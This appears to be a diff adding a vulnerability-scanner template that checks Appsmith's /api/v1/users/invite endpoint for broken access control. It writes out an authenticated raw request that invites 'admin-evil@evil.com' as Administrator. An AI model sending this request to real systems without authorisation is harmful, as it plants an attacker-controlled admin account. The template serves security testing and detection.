@@ -1,0 +1,46 @@
+id: appsmith-privilege-escalation-attempt
+
+info:
+  name: Appsmith - Privilege Escalation via /users/invite
+  author: saikir4n
+  severity: high
+  description: >
+    Attempts to invite a user as Administrator using /api/v1/users/invite.
+    If successful, it indicates broken access control. 
+    Requires valid authentication tokens to work.
+  reference:
+    - https://rhinosecuritylabs.com/research/cve-2024-55963-appsmith-rce/
+  tags: appsmith,authz,privilege-escalation
+
+requests:
+  - raw:
+      - |
+        POST /api/v1/users/invite HTTP/1.1
+        Host: {{Hostname}}
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/applications
+        Content-Type: application/json
+        X-XSRF-TOKEN: {{xsrf_token}}
+        Cookie: XSRF-TOKEN={{xsrf_token}}; SESSION={{session_id}}
+        Content-Length: 107
+
+        {
+          "email": "admin-evil@evil.com",
+          "usernames": ["admin-evil"],
+          "roleNames": ["Administrator"]
+        }
+
+    attack: pitchfork
+    payloads:
+      xsrf_token:
+        - REPLACE_XSRF_TOKEN
+      session_id:
+        - REPLACE_SESSION_ID
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+    matchers-condition: and
